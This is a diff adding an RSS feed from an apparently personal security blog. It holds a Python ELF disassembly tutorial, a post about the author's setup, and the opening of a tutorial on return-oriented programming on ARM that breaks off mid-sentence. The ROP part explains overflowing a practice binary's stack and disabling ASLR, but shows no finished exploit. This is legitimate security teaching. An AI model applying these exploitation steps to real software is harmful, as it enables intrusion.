@@ -1,0 +1,791 @@
+<?xml version='1.0' encoding='UTF-8'?>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0">
+  <channel>
+    <title>icyphox's blog</title>
+	<link>https://icyphox.sh/blog/</link>
+    <description>icyphox's blog</description>
+	<atom:link href="https://icyphox.sh/blog/feed.xml" rel="self" type="application/xml"/>
+    <image>
+      <url>https://icyphox.sh/icyphox.png</url>
+    </image>
+    <language>en-us</language>
+	<copyright>Creative Commons BY-NC-SA 4.0</copyright>
+<item>
+      <title>Python for Reverse Engineering #1: ELF Binaries</title>
+      <description>&lt;h1 id=&quot;python-for-reverse-engineering-1-elf-binaries&quot;&gt;Python for Reverse Engineering 1: ELF Binaries&lt;/h1&gt;
+
+&lt;h2 id=&quot;building-your-own-disassembly-tooling-for-thats-right-fun-and-profit&quot;&gt;Building your own disassembly tooling for — that’s right — fun and profit&lt;/h2&gt;
+
+&lt;p&gt;While solving complex reversing challenges, we often use established tools like radare2 or IDA for disassembling and debugging. But there are times when you need to dig in a little deeper and understand how things work under the hood.&lt;/p&gt;
+
+&lt;p&gt;Rolling your own disassembly scripts can be immensely helpful when it comes to automating certain processes, and eventually build your own homebrew reversing toolchain of sorts. At least, that’s what I’m attempting anyway.&lt;/p&gt;
+
+&lt;h3 id=&quot;setup&quot;&gt;Setup&lt;/h3&gt;
+
+&lt;p&gt;As the title suggests, you’re going to need a Python 3 interpreter before
+anything else. Once you’ve confirmed beyond reasonable doubt that you do,
+in fact, have a Python 3 interpreter installed on your system, run&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ pip install capstone pyelftools
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;where &lt;code&gt;capstone&lt;/code&gt; is the disassembly engine we’ll be scripting with and &lt;code&gt;pyelftools&lt;/code&gt; to help parse ELF files.&lt;/p&gt;
+
+&lt;p&gt;With that out of the way, let’s start with an example of a basic reversing
+challenge.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;/* chall.c */
+
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+
+int main() {
+   char *pw = malloc(9);
+   pw[0] = &#x27;a&#x27;;
+   for(int i = 1; i &amp;lt;= 8; i++){
+       pw[i] = pw[i - 1] + 1;
+   }
+   pw[9] = &#x27;\0&#x27;;
+   char *in = malloc(10);
+   printf(&quot;password: &quot;);
+   fgets(in, 10, stdin);        // &#x27;abcdefghi&#x27;
+   if(strcmp(in, pw) == 0) {
+       printf(&quot;haha yes!\n&quot;);
+   }
+   else {
+       printf(&quot;nah dude\n&quot;);
+   }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Compile it with GCC/Clang:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ gcc chall.c -o chall.elf
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;scripting&quot;&gt;Scripting&lt;/h3&gt;
+
+&lt;p&gt;For starters, let’s look at the different sections present in the binary.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# sections.py
+
+from elftools.elf.elffile import ELFFile
+
+with open(&#x27;./chall.elf&#x27;, &#x27;rb&#x27;) as f:
+    e = ELFFile(f)
+    for section in e.iter_sections():
+        print(hex(section[&#x27;sh_addr&#x27;]), section.name)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This script iterates through all the sections and also shows us where it’s loaded. This will be pretty useful later. Running it gives us&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;› python sections.py
+0x238 .interp
+0x254 .note.ABI-tag
+0x274 .note.gnu.build-id
+0x298 .gnu.hash
+0x2c0 .dynsym
+0x3e0 .dynstr
+0x484 .gnu.version
+0x4a0 .gnu.version_r
+0x4c0 .rela.dyn
+0x598 .rela.plt
+0x610 .init
+0x630 .plt
+0x690 .plt.got
+0x6a0 .text
+0x8f4 .fini
+0x900 .rodata
+0x924 .eh_frame_hdr
+0x960 .eh_frame
+0x200d98 .init_array
+0x200da0 .fini_array
+0x200da8 .dynamic
+0x200f98 .got
+0x201000 .data
+0x201010 .bss
+0x0 .comment
+0x0 .symtab
+0x0 .strtab
+0x0 .shstrtab
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Most of these aren’t relevant to us, but a few sections here are to be noted. The &lt;code&gt;.text&lt;/code&gt; section contains the instructions (opcodes) that we’re after. The &lt;code&gt;.data&lt;/code&gt; section should have strings and constants initialized at compile time. Finally, the &lt;code&gt;.plt&lt;/code&gt; which is the Procedure Linkage Table and the &lt;code&gt;.got&lt;/code&gt;, the Global Offset Table. If you’re unsure about what these mean, read up on the ELF format and its internals.&lt;/p&gt;
+
+&lt;p&gt;Since we know that the &lt;code&gt;.text&lt;/code&gt; section has the opcodes, let’s disassemble the binary starting at that address.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# disas1.py
+
+from elftools.elf.elffile import ELFFile
+from capstone import *
+
+with open(&#x27;./bin.elf&#x27;, &#x27;rb&#x27;) as f:
+    elf = ELFFile(f)
+    code = elf.get_section_by_name(&#x27;.text&#x27;)
+    ops = code.data()
+    addr = code[&#x27;sh_addr&#x27;]
+    md = Cs(CS_ARCH_X86, CS_MODE_64)
+    for i in md.disasm(ops, addr):        
+        print(f&#x27;0x{i.address:x}:\t{i.mnemonic}\t{i.op_str}&#x27;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The code is fairly straightforward (I think). We should be seeing this, on running&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;› python disas1.py | less      
+0x6a0: xor ebp, ebp
+0x6a2: mov r9, rdx
+0x6a5: pop rsi
+0x6a6: mov rdx, rsp
+0x6a9: and rsp, 0xfffffffffffffff0
+0x6ad: push rax
+0x6ae: push rsp
+0x6af: lea r8, [rip + 0x23a]
+0x6b6: lea rcx, [rip + 0x1c3]
+0x6bd: lea rdi, [rip + 0xe6]
+**0x6c4: call qword ptr [rip + 0x200916]**
+0x6ca: hlt
+... snip ...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The line in bold is fairly interesting to us. The address at &lt;code&gt;[rip + 0x200916]&lt;/code&gt; is equivalent to &lt;code&gt;[0x6ca + 0x200916]&lt;/code&gt;, which in turn evaluates to &lt;code&gt;0x200fe0&lt;/code&gt;. The first &lt;code&gt;call&lt;/code&gt; being made to a function at &lt;code&gt;0x200fe0&lt;/code&gt;? What could this function be?&lt;/p&gt;
+
+&lt;p&gt;For this, we will have to look at &lt;strong&gt;relocations&lt;/strong&gt;. Quoting &lt;a href=&quot;http://refspecs.linuxbase.org/elf/gabi4+/ch4.reloc.html&quot;&gt;linuxbase.org&lt;/a&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Relocation is the process of connecting symbolic references with symbolic definitions. For example, when a program calls a function, the associated call instruction must transfer control to the proper destination address at execution. Relocatable files must have “relocation entries’’ which are necessary because they contain information that describes how to modify their section contents, thus allowing executable and shared object files to hold the right information for a process’s program image.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;To try and find these relocation entries, we write a third script.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# relocations.py
+
+import sys
+from elftools.elf.elffile import ELFFile
+from elftools.elf.relocation import RelocationSection
+
+with open(&#x27;./chall.elf&#x27;, &#x27;rb&#x27;) as f:
+    e = ELFFile(f)
+    for section in e.iter_sections():
+        if isinstance(section, RelocationSection):
+            print(f&#x27;{section.name}:&#x27;)
+            symbol_table = e.get_section(section[&#x27;sh_link&#x27;])
+            for relocation in section.iter_relocations():
+                symbol = symbol_table.get_symbol(relocation[&#x27;r_info_sym&#x27;])
+                addr = hex(relocation[&#x27;r_offset&#x27;])
+                print(f&#x27;{symbol.name} {addr}&#x27;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Let’s run through this code real quick. We first loop through the sections, and check if it’s of the type &lt;code&gt;RelocationSection&lt;/code&gt;. We then iterate through the relocations from the symbol table for each section. Finally, running this gives us&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;› python relocations.py
+.rela.dyn:
+ 0x200d98
+ 0x200da0
+ 0x201008
+_ITM_deregisterTMCloneTable 0x200fd8
+**__libc_start_main 0x200fe0**
+__gmon_start__ 0x200fe8
+_ITM_registerTMCloneTable 0x200ff0
+__cxa_finalize 0x200ff8
+stdin 0x201010
+.rela.plt:
+puts 0x200fb0
+printf 0x200fb8
+fgets 0x200fc0
+strcmp 0x200fc8
+malloc 0x200fd0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Remember the function call at &lt;code&gt;0x200fe0&lt;/code&gt; from earlier? Yep, so that was a call to the well known &lt;code&gt;__libc_start_main&lt;/code&gt;. Again, according to &lt;a href=&quot;http://refspecs.linuxbase.org/LSB_3.1.0/LSB-generic/LSB-generic/baselib&amp;#8212;libc-start-main-.html&quot;&gt;linuxbase.org&lt;/a&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The &lt;code&gt;__libc_start_main()&lt;/code&gt; function shall perform any necessary initialization of the execution environment, call the &lt;em&gt;main&lt;/em&gt; function with appropriate arguments, and handle the return from &lt;code&gt;main()&lt;/code&gt;. If the &lt;code&gt;main()&lt;/code&gt; function returns, the return value shall be passed to the &lt;code&gt;exit()&lt;/code&gt; function.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;And its definition is like so&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;int __libc_start_main(int *(main) (int, char * *, char * *), 
+int argc, char * * ubp_av, 
+void (*init) (void), 
+void (*fini) (void), 
+void (*rtld_fini) (void), 
+void (* stack_end));
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Looking back at our disassembly&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;0x6a0: xor ebp, ebp
+0x6a2: mov r9, rdx
+0x6a5: pop rsi
+0x6a6: mov rdx, rsp
+0x6a9: and rsp, 0xfffffffffffffff0
+0x6ad: push rax
+0x6ae: push rsp
+0x6af: lea r8, [rip + 0x23a]
+0x6b6: lea rcx, [rip + 0x1c3]
+**0x6bd: lea rdi, [rip + 0xe6]**
+0x6c4: call qword ptr [rip + 0x200916]
+0x6ca: hlt
+... snip ...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;but this time, at the &lt;code&gt;lea&lt;/code&gt; or Load Effective Address instruction, which loads some address &lt;code&gt;[rip + 0xe6]&lt;/code&gt; into the &lt;code&gt;rdi&lt;/code&gt; register. &lt;code&gt;[rip + 0xe6]&lt;/code&gt; evaluates to &lt;code&gt;0x7aa&lt;/code&gt; which happens to be the address of our &lt;code&gt;main()&lt;/code&gt; function! How do I know that? Because &lt;code&gt;__libc_start_main()&lt;/code&gt;, after doing whatever it does, eventually jumps to the function at &lt;code&gt;rdi&lt;/code&gt;, which is generally the &lt;code&gt;main()&lt;/code&gt; function. It looks something like this&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn-images-1.medium.com/max/800/0*oQA2MwHjhzosF8ZH.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;To see the disassembly of &lt;code&gt;main&lt;/code&gt;, seek to &lt;code&gt;0x7aa&lt;/code&gt; in the output of the script we’d written earlier (&lt;code&gt;disas1.py&lt;/code&gt;).&lt;/p&gt;
+
+&lt;p&gt;From what we discovered earlier, each &lt;code&gt;call&lt;/code&gt; instruction points to some function which we can see from the relocation entries. So following each &lt;code&gt;call&lt;/code&gt; into their relocations gives us this&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;printf 0x650
+fgets  0x660
+strcmp 0x670
+malloc 0x680
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Putting all this together, things start falling into place. Let me highlight the key sections of the disassembly here. It’s pretty self-explanatory.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;0x7b2: mov edi, 0xa  ; 10
+0x7b7: call 0x680    ; malloc
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The loop to populate the &lt;code&gt;*pw&lt;/code&gt; string&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;0x7d0:  mov     eax, dword ptr [rbp - 0x14]
+0x7d3:  cdqe    
+0x7d5:  lea     rdx, [rax - 1]
+0x7d9:  mov     rax, qword ptr [rbp - 0x10]
+0x7dd:  add     rax, rdx
+0x7e0:  movzx   eax, byte ptr [rax]
+0x7e3:  lea     ecx, [rax + 1]
+0x7e6:  mov     eax, dword ptr [rbp - 0x14]
+0x7e9:  movsxd  rdx, eax
+0x7ec:  mov     rax, qword ptr [rbp - 0x10]
+0x7f0:  add     rax, rdx
+0x7f3:  mov     edx, ecx
+0x7f5:  mov     byte ptr [rax], dl
+0x7f7:  add     dword ptr [rbp - 0x14], 1
+0x7fb:  cmp     dword ptr [rbp - 0x14], 8
+0x7ff:  jle     0x7d0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And this looks like our &lt;code&gt;strcmp()&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;0x843:  mov     rdx, qword ptr [rbp - 0x10] ; *in
+0x847:  mov     rax, qword ptr [rbp - 8]    ; *pw
+0x84b:  mov     rsi, rdx             
+0x84e:  mov     rdi, rax
+0x851:  call    0x670                       ; strcmp  
+0x856:  test    eax, eax                    ; is = 0? 
+0x858:  jne     0x868                       ; no? jump to 0x868
+0x85a:  lea     rdi, [rip + 0xae]           ; &quot;haha yes!&quot; 
+0x861:  call    0x640                       ; puts
+0x866:  jmp     0x874
+0x868:  lea     rdi, [rip + 0xaa]           ; &quot;nah dude&quot;
+0x86f:  call    0x640                       ; puts  
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I’m not sure why it uses &lt;code&gt;puts&lt;/code&gt; here? I might be missing something; perhaps &lt;code&gt;printf&lt;/code&gt; calls &lt;code&gt;puts&lt;/code&gt;. I could be wrong. I also confirmed with radare2 that those locations are actually the strings “haha yes!” and “nah dude”.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt;: It&amp;#8217;s because of compiler optimization. A &lt;code&gt;printf()&lt;/code&gt; (in this case) is seen as a bit overkill, and hence gets simplified to a &lt;code&gt;puts()&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;
+
+&lt;p&gt;Wew, that took quite some time. But we’re done. If you’re a beginner, you might find this extremely confusing, or probably didn’t even understand what was going on. And that’s okay. Building an intuition for reading and grokking disassembly comes with practice. I’m no good at it either.&lt;/p&gt;
+
+&lt;p&gt;All the code used in this post is here: &lt;a href=&quot;https://github.com/icyphox/asdf/tree/master/reversing-elf&quot;&gt;https://github.com/icyphox/asdf/tree/master/reversing-elf&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Ciao for now, and I’ll see ya in #2 of this series — PE binaries. Whenever that is.&lt;/p&gt;
+</description>
+      <pubDate>Fri, 08 Feb 2019 00:00:00 +0000</pubDate>
+      <guid isPermaLink="false">https://icyphox.sh/blog/python-for-re-1/</guid>
+</item>
+<item>
+      <title>My Setup</title>
+      <description>&lt;h1 id=&quot;my-setup&quot;&gt;My Setup&lt;/h1&gt;
+
+&lt;h2 id=&quot;my-daily-drivers-hardware-and-software&quot;&gt;My daily drivers — hardware and software&lt;/h2&gt;
+
+&lt;h3 id=&quot;hardware&quot;&gt;Hardware&lt;/h3&gt;
+
+&lt;p&gt;The only computer I have with me is my &lt;a href=&quot;https://store.hp.com/us/en/mdp/laptops/envy-13&quot;&gt;HP Envy 13 (2018)&lt;/a&gt; (my model looks a little different). It’s a 13” ultrabook, with an i5 8250u,
+8 gigs of RAM and a 256 GB NVMe SSD. It’s a very comfy machine that does everything I need it to.&lt;/p&gt;
+
+&lt;p&gt;For my phone, I use a &lt;a href=&quot;https://www.oneplus.in/6t&quot;&gt;OnePlus 6T&lt;/a&gt;, running stock &lt;a href=&quot;https://www.oneplus.in/oxygenos&quot;&gt;OxygenOS&lt;/a&gt;. As of this writing, its bootloader hasn’t been unlocked and nor has the device been rooted.
+I’m also a proud owner of a &lt;a href=&quot;https://en.wikipedia.org/wiki/Nexus_5&quot;&gt;Nexus 5&lt;/a&gt;, which I really wish Google rebooted. It’s surprisingly still usable and runs Android Pie, although the SIM slot is ruined and the battery backup is abysmal.&lt;/p&gt;
+
+&lt;p&gt;My watch is a &lt;a href=&quot;https://www.samsung.com/in/wearables/gear-s3-frontier-r760/&quot;&gt;Samsung Gear S3 Frontier&lt;/a&gt;. Tizen is definitely better than Android Wear.&lt;/p&gt;
+
+&lt;p&gt;My keyboard, although not with me in college, is a very old &lt;a href=&quot;https://www.amazon.com/Dell-Keyboard-Model-SK-8110-Interface/dp/B00366HMMO&quot;&gt;Dell SK-8110&lt;/a&gt;. 
+For the little bit of gaming that I do, I use a &lt;a href=&quot;https://www.hpshopping.in/hp-m150-gaming-mouse-3dr63pa.html&quot;&gt;HP m150&lt;/a&gt; gaming mouse. It’s the perfect size (and color).&lt;/p&gt;
+
+&lt;p&gt;For my music, I use the &lt;a href=&quot;https://www.boseindia.com/en_in/products/headphones/over_ear_headphones/soundlink-around-ear-wireless-headphones-ii.html&quot;&gt;Bose SoundLink II&lt;/a&gt;. 
+Great pair of headphones, although the ear cups need replacing.&lt;/p&gt;
+
+&lt;h3 id=&quot;and-the-software&quot;&gt;And the software&lt;/h3&gt;
+
+&lt;p&gt;&lt;del&gt;My distro of choice for the past ~1 year has been &lt;a href=&quot;https://elementary.io&quot;&gt;elementary OS&lt;/a&gt;. I used to be an Arch Linux elitist, complete with an esoteric
+window manager, all riced. I now use whatever JustWorks™.&lt;/del&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt;: As of June 2019, I&amp;#8217;ve switched over to a vanilla Debian 9 Stretch install,
+running &lt;a href=&quot;https://i3wm.org&quot;&gt;i3&lt;/a&gt; as my window manager. If you want, you can dig through my configs at my &lt;a href=&quot;https://github.com/icyphox/dotfiles&quot;&gt;dotfiles&lt;/a&gt; repo. &lt;/p&gt;
+
+&lt;p&gt;Here’s a (riced) screenshot of my desktop. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.redd.it/jk574gworp331.png&quot; alt=&quot;scrot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Most of my work is done in either the browser, or the terminal.
+My shell is pure &lt;a href=&quot;http://www.zsh.org&quot;&gt;zsh&lt;/a&gt;, as in no plugin frameworks. It’s customized using built-in zsh functions. Yes, you don’t actually need
+a framework. It’s useless bloat. The prompt itself is generated using a framework I built in &lt;a href=&quot;https://nim-lang.org&quot;&gt;Nim&lt;/a&gt; — &lt;a href=&quot;https://github.com/icyphox/nicy&quot;&gt;nicy&lt;/a&gt;.
+My primary text editor is &lt;a href=&quot;https://neovim.org&quot;&gt;nvim&lt;/a&gt;. Again, all configs in my dotfiles repo linked above.
+I manage all my passwords using &lt;a href=&quot;https://passwordstore.org&quot;&gt;pass(1)&lt;/a&gt;, and I use &lt;a href=&quot;https://github.com/carnager/rofi-pass&quot;&gt;rofi-pass&lt;/a&gt; to access them via &lt;code&gt;rofi&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Most of my security tooling is typically run via a Kali Linux docker container. This is convenient for many reasons, keeps your global namespace
+clean and a single command to drop into a Kali shell.&lt;/p&gt;
+
+&lt;p&gt;I use a DigitalOcean droplet (BLR1) as a public filehost, found at &lt;a href=&quot;https://x.icyphox.sh&quot;&gt;x.icyphox.sh&lt;/a&gt;. The UI is the wonderful &lt;a href=&quot;https://github.com/zeit/serve&quot;&gt;serve&lt;/a&gt;, by &lt;a href=&quot;https://zeit.co&quot;&gt;ZEIT&lt;/a&gt;.
+The same box also serves as my IRC bouncer and OpenVPN (TCP), which I tunnel via SSH running on 443. Campus firewall woes. &lt;/p&gt;
+
+&lt;p&gt;I plan on converting my desktop back at home into a homeserver setup. Soon™.&lt;/p&gt;
+</description>
+      <pubDate>Mon, 13 May 2019 00:00:00 +0000</pubDate>
+      <guid isPermaLink="false">https://icyphox.sh/blog/my-setup/</guid>
+</item>
+<item>
+      <title>Return Oriented Programming on ARM (32-bit)</title>
+      <description>&lt;h1 id=&quot;return-oriented-programming-on-arm-32-bit&quot;&gt;Return Oriented Programming on ARM (32-bit)&lt;/h1&gt;
+
+&lt;h2 id=&quot;making-stack-based-exploitation-great-again&quot;&gt;Making stack-based exploitation great again!&lt;/h2&gt;
+
+&lt;p&gt;Before we start &lt;em&gt;anything&lt;/em&gt;, you’re expected to know the basics of ARM
+assembly to follow along. I highly recommend
+&lt;a href=&quot;https://twitter.com/fox0x01&quot;&gt;Azeria’s&lt;/a&gt; series on &lt;a href=&quot;https://azeria-labs.com/writing-arm-assembly-part-1/&quot;&gt;ARM Assembly
+Basics&lt;/a&gt;. Once you’re
+comfortable with it, proceed with the next bit — environment setup.&lt;/p&gt;
+
+&lt;h3 id=&quot;setup&quot;&gt;Setup&lt;/h3&gt;
+
+&lt;p&gt;Since we’re working with the ARM architecture, there are two options to go
+forth with: &lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Emulate — head over to &lt;a href=&quot;https://www.qemu.org/download/&quot;&gt;qemu.org/download&lt;/a&gt; and install QEMU. 
+And then download and extract the ARMv6 Debian Stretch image from one of the links &lt;a href=&quot;https://blahcat.github.io/qemu/&quot;&gt;here&lt;/a&gt;.
+The scripts found inside should be self-explanatory.&lt;/li&gt;
+&lt;li&gt;Use actual ARM hardware, like an RPi.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;For debugging and disassembling, we’ll be using plain old &lt;code&gt;gdb&lt;/code&gt;, but you
+may use &lt;code&gt;radare2&lt;/code&gt;, IDA or anything else, really. All of which can be
+trivially installed.&lt;/p&gt;
+
+&lt;p&gt;And for the sake of simplicity, disable ASLR:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Finally, the binary we’ll be using in this exercise is &lt;a href=&quot;https://twitter.com/bellis1000&quot;&gt;Billy Ellis’&lt;/a&gt;
+&lt;a href=&quot;/static/files/roplevel2.c&quot;&gt;roplevel2&lt;/a&gt;. &lt;/p&gt;
+
+&lt;p&gt;Compile it:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ gcc roplevel2.c -o rop2
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;With that out of the way, here’s a quick run down of what ROP actually is.&lt;/p&gt;
+
+&lt;h3 id=&quot;a-primer-on-rop&quot;&gt;A primer on ROP&lt;/h3&gt;
+
+&lt;p&gt;ROP or Return Oriented Programming is a modern exploitation technique that’s
+used to bypass protections like the &lt;strong&gt;NX bit&lt;/strong&gt; (no-execute bit) and &lt;strong&gt;code sigining&lt;/strong&gt;.
+In essence, no code in the binary is actually modified and the entire exploit
+is crafted out of pre-existing artifacts within the binary, known as &lt;strong&gt;gadgets&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;A gadget is essentially a small sequence of code (instructions), ending with
+a &lt;code&gt;ret&lt;/code&gt;, or a return instruction. In our case, since we’re dealing with ARM
+code, there is no &lt;code&gt;ret&lt;/code&gt; instruction but rather a &lt;code&gt;pop {pc}&lt;/code&gt; or a &lt;code&gt;bx lr&lt;/code&gt;.
+These gadgets are &lt;em&gt;chained&lt;/em&gt; together by jumping (returning) from one onto the other
+to form what’s called as a &lt;strong&gt;ropchain&lt;/strong&gt;. At the end of a ropchain,
+there’s generally a call to &lt;code&gt;system()&lt;/code&gt;, to acheive code execution.&lt;/p&gt;
+
+&lt;p&gt;In practice, the process of executing a ropchain is something like this:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;confirm the existence of a stack-based buffer overflow&lt;/li&gt;
+&lt;li&gt;identify the offset at which the instruction pointer gets overwritten&lt;/li&gt;
+&lt;li&gt;locate the addresses of the gadgets you wish to use&lt;/li&gt;
+&lt;li&gt;craft your input keeping in mind the stack’s layout, and chain the addresses
+of your gadgets&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://twitter.com/LiveOverflow&quot;&gt;LiveOverflow&lt;/a&gt; has a &lt;a href=&quot;https://www.youtube.com/watch?v=zaQVNM3or7k&amp;amp;list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&amp;amp;index=46&amp;amp;t=0s&quot;&gt;beautiful video&lt;/a&gt; where he explains ROP using “weird machines”. 
+Check it out, it might be just what you needed for that “aha!” moment :)&lt;/p&gt;
+
+&lt;p&gt;Still don’t get it? Don’t fret, we’ll look at &lt;em&gt;actual&lt;/em&gt; exploit code in a bit and hopefully
+that should put things into perspective.&lt;/p&gt;
+
+&lt;h3 id=&quot;exploring-our-binary&quot;&gt;Exploring our binary&lt;/h3&gt;
+
+&lt;p&gt;Start by running it, and entering any arbitrary string. On entering a fairly
+large string, say, “A” × 20, we
+see a segmentation fault occur.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/string_segfault.png&quot; alt=&quot;string and segfault&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now, open it up in &lt;code&gt;gdb&lt;/code&gt; and look at the functions inside it.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/gdb_functions.png&quot; alt=&quot;gdb functions&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There are three functions that are of importance here, &lt;code&gt;main&lt;/code&gt;, &lt;code&gt;winner&lt;/code&gt; and 
+&lt;code&gt;gadget&lt;/code&gt;. Disassembling the &lt;code&gt;main&lt;/code&gt; function:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/gdb_main_disas.png&quot; alt=&quot;gdb main disassembly&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We see a buffer of 16 bytes being created (&lt;code&gt;sub sp, sp, #16&lt;/code&gt;), and some calls
+to &lt;code&gt;puts()&lt;/code&gt;/&lt;code&gt;printf()&lt;/code&gt; and &lt;code&gt;scanf()&lt;/code&gt;. Looks like &lt;code&gt;winner&lt;/code&gt; and &lt;code&gt;gadget&lt;/code&gt; are 
+never actually called.&lt;/p&gt;
+
+&lt;p&gt;Disassembling the &lt;code&gt;gadget&lt;/code&gt; function:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/gdb_gadget_disas.png&quot; alt=&quot;gdb gadget disassembly&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This is fairly simple, the stack is being initialized by &lt;code&gt;push&lt;/code&gt;ing &lt;code&gt;{r11}&lt;/code&gt;,
+which is also the frame pointer (&lt;code&gt;fp&lt;/code&gt;). What’s interesting is the &lt;code&gt;pop {r0, pc}&lt;/code&gt;
+instruction in the middle. This is a &lt;strong&gt;gadget&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;We can use this to control what goes into &lt;code&gt;r0&lt;/code&gt; and &lt;code&gt;pc&lt;/code&gt;. Unlike in x86 where
+arguments to functions are passed on the stack, in ARM the registers &lt;code&gt;r0&lt;/code&gt; to &lt;code&gt;r3&lt;/code&gt;
+are used for this. So this gadget effectively allows us to pass arguments to
+functions using &lt;code&gt;r0&lt;/code&gt;, and subsequently jumping to them by passing its address
+in &lt;code&gt;pc&lt;/code&gt;. Neat.&lt;/p&gt;
+
+&lt;p&gt;Moving on to the disassembly of the &lt;code&gt;winner&lt;/code&gt; function:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/gdb_disas_winner.png&quot; alt=&quot;gdb winner disassembly&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Here, we see a calls to &lt;code&gt;puts()&lt;/code&gt;, &lt;code&gt;system()&lt;/code&gt; and finally, &lt;code&gt;exit()&lt;/code&gt;.
+So our end goal here is to, quite obviously, execute code via the &lt;code&gt;system()&lt;/code&gt;
+function.&lt;/p&gt;
+
+&lt;p&gt;Now that we have an overview of what’s in the binary, let’s formulate a method
+of exploitation by messing around with inputs.&lt;/p&gt;
+
+&lt;h3 id=&quot;messing-around-with-inputs&quot;&gt;Messing around with inputs :^)&lt;/h3&gt;
+
+&lt;p&gt;Back to &lt;code&gt;gdb&lt;/code&gt;, hit &lt;code&gt;r&lt;/code&gt; to run and pass in a patterned input, like in the
+screenshot.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/gdb_info_reg_segfault.png&quot; alt=&quot;gdb info reg post segfault&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We hit a segfault because of invalid memory at address &lt;code&gt;0x46464646&lt;/code&gt;. Notice
+the &lt;code&gt;pc&lt;/code&gt; has been overwritten with our input.
+So we smashed the stack alright, but more importantly, it’s at the letter ‘F’.&lt;/p&gt;
+
+&lt;p&gt;Since we know the offset at which the &lt;code&gt;pc&lt;/code&gt; gets overwritten, we can now
+control program execution flow. Let’s try jumping to the &lt;code&gt;winner&lt;/code&gt; function.&lt;/p&gt;
+
+&lt;p&gt;Disassemble &lt;code&gt;winner&lt;/code&gt; again using &lt;code&gt;disas winner&lt;/code&gt; and note down the offset
+of the second instruction — &lt;code&gt;add r11, sp, #4&lt;/code&gt;. 
+For this, we’ll use Python to print our input string replacing &lt;code&gt;FFFF&lt;/code&gt; with
